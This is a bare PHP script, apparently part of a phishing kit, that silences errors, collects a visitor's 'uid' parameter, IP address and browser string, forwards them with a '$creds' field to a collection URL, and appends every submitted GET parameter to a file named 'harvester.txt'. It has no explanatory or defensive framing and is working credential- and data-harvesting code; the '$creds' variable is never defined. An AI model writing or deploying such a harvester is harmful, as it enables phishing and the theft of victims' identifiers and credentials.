<?php
// Turn off all error reporting
error_reporting(0);

$uid = $_GET['uid'];
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$host = $_SERVER['HTTP_HOST'];
$url = "http://127.0.0.1" . '/';
$data = array('uid' => $uid, 'browser_info' => $browser, 'ip_address' => $ip, 'extra' => $creds);

// use key 'http' even if you send the request to https://...
$options = array(
    'http' => array(
    'header'  => 'Content-type: application/x-www-form-urlencoded',
    'method'  => 'GET',
    'content' => http_build_query($data),
    ),
);
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
?>
<?php $file = 'harvester.txt';file_put_contents($file, print_r($_GET, true), FILE_APPEND);?>
